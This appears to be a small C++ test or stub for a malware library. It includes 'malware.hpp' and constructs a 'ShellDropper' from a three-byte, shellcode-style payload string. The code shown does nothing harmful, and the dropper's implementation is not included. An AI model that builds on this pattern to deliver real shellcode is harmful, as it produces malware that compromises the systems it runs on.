#include "malware.hpp"
#include <iostream>
#include <string>

int main(int argc, char** argv){
    if(argc>1)
        std::cout<<argv[argc-1]; // avoid Werror unused parameter

    std::string payload = "\xfc\xe8\x82";
    ShellDropper dropper = ShellDropper(payload.c_str());
    return 0;
}